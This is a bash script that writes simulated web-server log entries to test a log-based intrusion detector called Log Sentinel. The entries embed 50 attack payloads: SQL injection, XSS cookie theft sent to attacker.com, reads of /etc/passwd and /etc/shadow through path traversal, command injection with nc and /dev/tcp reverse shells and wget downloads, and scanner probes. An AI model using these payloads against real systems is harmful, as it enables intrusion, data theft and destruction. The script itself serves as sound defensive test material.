#!/bin/bash
# Live Attack Simulator for Log Sentinel - Enhanced Version
# Run this in Terminal 2 while sentinel.py is running in Terminal 1
# Generates 5 attack types with high variety

LOG_FILE="test_access.log"
DELAY=1  # seconds between each attack

log() {
    local ip=$1
    local path=$2
    local status=$3
    local useragent=$4
    local timestamp=$(date '+%d/%b/%Y:%H:%M:%S +0000')
    echo "$ip - - [$timestamp] \"GET $path HTTP/1.1\" $status 1234 \"-\" \"$useragent\"" >> "$LOG_FILE"
}

echo "=========================================="
echo "Enhanced Live Attack Simulator"
echo "Log-Sentinel Threat Detection System"
echo "=========================================="
echo "Log File: $LOG_FILE"
echo "Press Ctrl+C to stop"
echo ""
sleep 2

# ============================================
# 1. SQL INJECTION ATTACKS (10 variants)
# ============================================
echo "[ATTACK TYPE 1/5] SQL Injection (10 variants)..."
log "192.168.1.100" "/login.php?id=1' UNION SELECT * FROM users--" "200" "Mozilla/5.0"
sleep $DELAY

log "192.168.1.100" "/search.php?q=1' OR '1'='1" "200" "Mozilla/5.0"
sleep $DELAY

log "192.168.1.101" "/products.php?cat_id=1; DROP TABLE products;--" "200" "Chrome/95.0"
sleep $DELAY

log "192.168.1.102" "/user.php?id=1' AND SLEEP(5)--" "200" "Safari/14.0"
sleep $DELAY

log "192.168.1.103" "/article.php?slug=' UNION ALL SELECT username,password FROM admin--" "200" "Firefox/88.0"
sleep $DELAY

log "192.168.1.104" "/blog.php?post_id=1' OR 'a'='a" "200" "curl/7.68.0"
sleep $DELAY

log "192.168.1.105" "/api/users?filter=1' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--" "200" "Python-requests/2.26.0"
sleep $DELAY

log "192.168.1.106" "/product.php?id=-1 UNION SELECT version(),user(),database()--" "200" "Mozilla/5.0"
sleep $DELAY

log "192.168.1.107" "/getdata.php?id=1' AND (SELECT COUNT(*) FROM users)>0--" "200" "wget/1.20"
sleep $DELAY

log "192.168.1.108" "/search?term=admin' OR '1'='1' UNION SELECT NULL--" "200" "curl/7.68.0"
sleep $DELAY

# ============================================
# 2. XSS ATTACKS (10 variants)
# ============================================
echo "[ATTACK TYPE 2/5] XSS Attacks (10 variants)..."
log "10.0.0.50" "/comment.php?text=<script>alert('XSS')</script>" "200" "Firefox/88.0"
sleep $DELAY

log "10.0.0.50" "/profile.php?bio=<img src=x onerror=alert(1)>" "200" "Chrome/90.0"
sleep $DELAY

log "10.0.0.51" "/post.php?msg=<svg onload=fetch('http://attacker.com/steal')>" "200" "Safari/14.0"
sleep $DELAY

log "10.0.0.52" "/forum.php?post=<iframe src='javascript:alert(document.cookie)'></iframe>" "200" "Mozilla/5.0"
sleep $DELAY

log "10.0.0.53" "/search.php?q=<body onload=alert('XSS')>" "200" "Firefox/89.0"
sleep $DELAY

log "10.0.0.54" "/feedback.php?comment=<input onfocus=alert('XSS') autofocus>" "200" "Chrome/91.0"
sleep $DELAY

log "10.0.0.55" "/news.php?article=<script>new Image().src='http://attacker.com/?c='+document.cookie</script>" "200" "curl/7.68.0"
sleep $DELAY

log "10.0.0.56" "/chat.php?msg=<marquee onstart=alert('XSS')>" "200" "wget/1.20"
sleep $DELAY

log "10.0.0.57" "/profile.php?name=<style>@import 'http://attacker.com/malicious.css'</style>" "200" "Mozilla/5.0"
sleep $DELAY

log "10.0.0.58" "/settings.php?theme=<img src=x onerror=\"fetch('http://attacker.com/log?cookie='+document.cookie)\">" "200" "Chrome/92.0"
sleep $DELAY

# ============================================
# 3. PATH TRAVERSAL ATTACKS (10 variants)
# ============================================
echo "[ATTACK TYPE 3/5] Path Traversal (10 variants)..."
log "172.16.0.25" "/download.php?file=../../../../etc/passwd" "404" "curl/7.68.0"
sleep $DELAY

log "172.16.0.25" "/view.php?page=../../windows/system32/config/sam" "404" "wget/1.20"
sleep $DELAY

log "172.16.0.26" "/file.php?path=../../../../../../../etc/shadow" "403" "Mozilla/5.0"
sleep $DELAY

log "172.16.0.27" "/include.php?file=....//....//....//....//etc/hosts" "404" "Chrome/93.0"
sleep $DELAY

log "172.16.0.28" "/load.php?config=../../config/database.yml" "200" "Python/3.9"
sleep $DELAY

log "172.16.0.29" "/export.php?doc=../../../sensitive_data.txt" "200" "curl/7.68.0"
sleep $DELAY

log "172.16.0.30" "/image.php?src=../../../../var/www/html/.htaccess" "404" "Firefox/90.0"
sleep $DELAY

log "172.16.0.31" "/template.php?file=...%2F...%2Fetc%2Fpasswd" "404" "Safari/14.0"
sleep $DELAY

log "172.16.0.32" "/scripts/load.php?script=../../../../proc/self/environ" "403" "wget/1.20"
sleep $DELAY

log "172.16.0.33" "/page.php?redirect=..\\..\\..\\windows\\win.ini" "404" "curl/7.68.0"
sleep $DELAY

# ============================================
# 4. COMMAND INJECTION ATTACKS (10 variants)
# ============================================
echo "[ATTACK TYPE 4/5] Command Injection (10 variants)..."
log "203.0.113.45" "/ping.php?host=google.com;cat /etc/passwd" "500" "Python/3.8"
sleep $DELAY

log "203.0.113.45" "/cmd.php?exec=ls+-la+|+nc+attacker.com+4444" "403" "curl/7.68.0"
sleep $DELAY

log "203.0.113.46" "/nslookup.php?domain=google.com&cmd=whoami" "200" "Mozilla/5.0"
sleep $DELAY

log "203.0.113.47" "/tracert.php?ip=8.8.8.8;wget http://attacker.com/shell.sh" "500" "Chrome/91.0"
sleep $DELAY

log "203.0.113.48" "/execute.php?service=start Apache&&del /F /S /Q C:\\*" "403" "Firefox/89.0"
sleep $DELAY

log "203.0.113.49" "/net.php?host=localhost|bash+-i+>%26/dev/tcp/attacker.com/4444+0>%261" "500" "curl/7.68.0"
sleep $DELAY

log "203.0.113.50" "/backup.php?file=data.zip;tar -czf shell.tar.gz web_files" "200" "wget/1.20"
sleep $DELAY

log "203.0.113.51" "/search.php?term=test&exec=mv /tmp/uploads/* /var/www/" "403" "Python/requests"
sleep $DELAY

log "203.0.113.52" "/process.php?id=1234;kill -9 1234;nohup nc -e /bin/sh attacker.com 5555" "500" "curl/7.68.0"
sleep $DELAY

log "203.0.113.53" "/system.php?cmd=echo+attacker_shell.sh+>+/tmp/shell.sh;sh /tmp/shell.sh" "403" "Mozilla/5.0"
sleep $DELAY

# ============================================
# 5. SCANNER PATTERNS (10 variants)
# ============================================
echo "[ATTACK TYPE 5/5] Security Scanners (10 variants)..."
log "198.51.100.89" "/admin" "404" "sqlmap/1.5.3"
sleep $DELAY

log "198.51.100.89" "/wp-admin" "404" "Nikto/2.1.6"
sleep $DELAY

log "198.51.100.89" "/phpmyadmin" "404" "nuclei/2.9.1"
sleep $DELAY

log "198.51.100.90" "/\.git" "404" "GitTools/3.0"
sleep $DELAY

log "198.51.100.91" "/\.env" "404" "EnvScan/1.0"
sleep $DELAY

log "198.51.100.92" "/backup.sql" "404" "wpscan/3.8.16"
sleep $DELAY

log "198.51.100.93" "/web.config" "404" "Nmap/7.91"
sleep $DELAY

log "198.51.100.94" "/config/database.yml" "404" "Burp/2021.11"
sleep $DELAY

log "198.51.100.95" "/server-status" "403" "masscan/1.0.5"
sleep $DELAY

log "198.51.100.96" "/\.well-known/security.txt" "404" "APKTracker/2.0"
sleep $DELAY

echo ""
echo "=========================================="
echo "All attacks sent successfully!"
echo "Total: 50 attack requests (10 per type)"
echo "=========================================="
echo "Check Terminal 1 for real-time alerts."
echo "Check alerts.log for the full record."
echo ""
